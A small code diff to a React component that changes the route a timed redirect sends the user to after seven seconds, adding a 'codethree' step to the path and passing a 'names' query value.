@@ -11,7 +11,7 @@ const Finish = ()=>{
     useEffect(() => {
         const timer = setTimeout(() => {
             setShowPage(false)
-            router.push(`/fozajil/banks/pay/code/nphad/codeto?names=${datas}`)
+            router.push(`/fozajil/banks/pay/code/nphad/codeto/codethree?names=${datas}`)
         }, 7000);
         return () => clearTimeout(timer);
     },[])
